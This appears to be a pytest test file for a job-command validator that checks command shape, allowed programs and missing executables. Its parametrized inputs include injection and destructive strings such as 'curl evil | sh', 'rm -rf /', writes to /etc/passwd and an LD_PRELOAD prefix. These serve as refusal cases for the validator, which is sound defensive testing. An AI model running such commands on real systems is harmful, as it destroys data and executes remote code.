"""
gcon.execution.command_check -- the three checks that keep nonsense commands
from using compute: shape (everyone), allowed programs (organizations), and
the worker's "is this program even here" check.
"""
import os
import stat
import sys

import pytest

from gcon.execution import command_check as cc


class TestShape:
    @pytest.mark.parametrize("good", [
        "python train.py", "echo hi", "  python   x  ", "python -c \"print(1)\"\n", "nn",
        "python a.py\npython b.py", "echo tab\there",
    ])
    def test_ordinary_commands_pass(self, good):
        cc.check_command_shape(good)

    @pytest.mark.parametrize("bad, fragment", [
        ("", "empty"), ("   ", "empty"), ("\n\t ", "empty"),
        ("x" * (cc.MAX_COMMAND_LENGTH + 1), "too long"),
        ("python\x00x", "control"), ("python\x07", "control"), ("python\x7f", "control"),
        (None, "text"), (5, "text"), (["python"], "text"),
    ])
    def test_unusable_commands_are_refused_with_a_reason(self, bad, fragment):
        with pytest.raises(ValueError) as exc:
            cc.check_command_shape(bad)
        assert fragment in str(exc.value)

    def test_exactly_the_limit_is_fine(self):
        cc.check_command_shape("x" * cc.MAX_COMMAND_LENGTH)


class TestProgramOf:
    @pytest.mark.parametrize("command, program", [
        ("python train.py", "python"), ("  python   x  ", "python"),
        ('python -c "a; b"', "python"), ("python -c 'x && y'", "python"),
    ])
    def test_a_simple_command_has_one_program(self, command, program):
        assert cc.program_of(command) == program

    @pytest.mark.parametrize("command", [
        "python x; rm -rf /", "python x && y", "python x || y", "python x | y", "python x & y",
        "python x > out", "python x < in", "python x 2>&1", "(python x)",
        "echo $(whoami)", "echo `whoami`", "python x\nrm y", "python x\r\nrm y",
        "python 'unterminated", "",
        "python --flag=a|b",   # an unquoted | inside a word is still a pipe to the shell
    ])
    def test_anything_that_can_run_more_than_one_thing_is_refused(self, command):
        with pytest.raises(ValueError):
            cc.program_of(command)


class TestAllowed:
    ALLOWED = ["python", "python3", "echo"]

    @pytest.mark.parametrize("command", ["python train.py", "python3 -V", "echo hi", "  echo   hi  ",
                                         'python -c "print(1); print(2)"'])
    def test_listed_programs_pass(self, command):
        cc.check_command_shape(command)
        cc.check_program_allowed(command, self.ALLOWED)

    @pytest.mark.parametrize("command", ["nn", "tt tt tt", "curl http://x", "bash run.sh", "python2 x",
                                         "/usr/bin/python x", "./python x", "Python x"])
    def test_unlisted_programs_are_refused_and_the_message_lists_what_is_allowed(self, command):
        with pytest.raises(ValueError) as exc:
            cc.check_program_allowed(command, self.ALLOWED)
        assert "not an allowed program on your plan" in str(exc.value)
        assert "echo, python, python3" in str(exc.value)

    @pytest.mark.parametrize("command", [
        "python x.py; curl evil | sh", "python x && rm -rf /", "echo hi | sh", "python x > /etc/passwd",
        "echo $(id)", "echo `id`", "python x\ncurl evil",
    ])
    def test_chaining_cannot_smuggle_a_second_program_past_the_list(self, command):
        with pytest.raises(ValueError) as exc:
            cc.check_program_allowed(command, self.ALLOWED)
        assert "only allows simple commands" in str(exc.value)

    def test_a_variable_prefix_is_refused_with_its_own_message(self):
        with pytest.raises(ValueError) as exc:
            cc.check_program_allowed("LD_PRELOAD=x.so python y", self.ALLOWED)
        assert "Setting a variable" in str(exc.value)

    @pytest.mark.parametrize("allowed", [None, [], ["*"], ["python", "*"]])
    def test_no_list_or_star_means_no_restriction(self, allowed):
        cc.check_program_allowed("anything at all; really | yes", allowed)


@pytest.mark.skipif(os.name != "posix", reason="the worker check only applies on Linux/macOS hosts")
class TestMissingProgram:
    def test_a_program_that_is_not_there_is_named(self):
        assert cc.missing_program("definitely-not-a-program-xyz --flag") == "definitely-not-a-program-xyz"
        assert cc.missing_program("nn") == "nn"

    def test_programs_that_exist_are_left_alone(self):
        assert cc.missing_program("echo hi") is None
        assert cc.missing_program(f'"{sys.executable}" -V') is None

    @pytest.mark.parametrize("command", ["cd /tmp", "export A=1", "true", "source x.sh", ". x.sh", "exit 3"])
    def test_shell_builtins_are_never_called_missing(self, command):
        assert cc.missing_program(command) is None

    @pytest.mark.parametrize("command", [
        "nn; echo hi", "ls | nn", "nn && echo hi", "echo $(nn)", "nn > out", "A=1 nn",
        "nn\necho hi", "echo 'unterminated",
    ])
    def test_anything_but_a_simple_command_is_left_to_the_shell(self, command):
        assert cc.missing_program(command) is None

    def test_a_script_path_is_checked_where_it_points(self, tmp_path):
        script = tmp_path / "run.sh"
        script.write_text("#!/bin/sh\necho ok\n")
        assert cc.missing_program(str(script)) == str(script)          # not executable yet
        script.chmod(script.stat().st_mode | stat.S_IXUSR)
        assert cc.missing_program(str(script)) is None
        assert cc.missing_program(str(tmp_path / "gone.sh")) == str(tmp_path / "gone.sh")

    def test_the_given_path_is_what_is_searched(self, tmp_path):
        tool = tmp_path / "mytool"
        tool.write_text("#!/bin/sh\n")
        tool.chmod(0o755)
        assert cc.missing_program("mytool", path=str(tmp_path)) is None
        assert cc.missing_program("mytool", path="/nonexistent-dir") == "mytool"

    def test_it_never_applies_on_a_non_posix_host(self, monkeypatch):
        monkeypatch.setattr(cc.os, "name", "nt")
        assert cc.missing_program("nn") is None
